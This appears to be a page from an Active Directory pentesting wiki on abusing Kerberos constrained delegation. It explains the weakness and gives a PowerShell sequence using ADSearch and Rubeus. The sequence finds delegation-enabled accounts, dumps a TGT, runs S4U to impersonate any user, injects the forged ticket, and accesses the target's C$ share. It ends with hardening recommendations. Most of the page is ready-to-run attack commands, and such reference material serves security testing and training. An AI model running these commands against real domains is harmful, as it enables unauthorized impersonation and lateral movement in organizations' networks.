# Constrained Delegation
---

## Vulnerability

Contrary to [Unconstrained Delegation](/ad/unconstrained/), constrained delegation restricts services to which a domain computer can on behalf of a user. In other words, the delegation can be:
* Constrained: the computer can act on behalf of **any user** for **some services**.
* Unconstrained: the computer can act on behalf of **any user** for **any service**.

{: .important }
> Constrained delegation works for **users** as well as **computers**.

## Prerequisites

* Having compromised a domain joined computer or user with constrained delegation allowed.

## Exploit

```powershell
# Look for vulnerable domain computers and users.
.\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
.\ADSearch.exe --search "(&(objectCategory=user)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# On the compromised domain computer, list Kerberos TGTs.
.\Rubeus.exe triage

# On the compromised domain computer, dump target's Kerberos TGT.
.\Rubeus.exe dump /luid:$LUID /service:krbtgt /nowrap

# Now, obtain a TGS for the service you want to access by impersonating any user.
.\Rubeus.exe s4u /impersonateuser:$Username /msdsspn:$Service/$TargetFQDN /user:$Hostname$ /ticket:$Base64EncodedTicket /nowrap

# Once S4U2Proxy succeded, inject the gathered ticket in a dummy session.
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$DomainName /username:$Username /password:$Whatever /ticket:$S4UProxyResult

# Verify you can access your target.
ls \\$TargetFQDN\C$
```

## Recommendations

- [ ] Avoid using constrained delegation, use [resource-based constrained delegation](/ad/rbconstrained) instead.
- [ ] Enforce *Account is sensitive and cannot be delegated* for privileged domain users.
- [ ] Limit services on which privileged domain users can authenticate to avoid caching Kerberos tickets.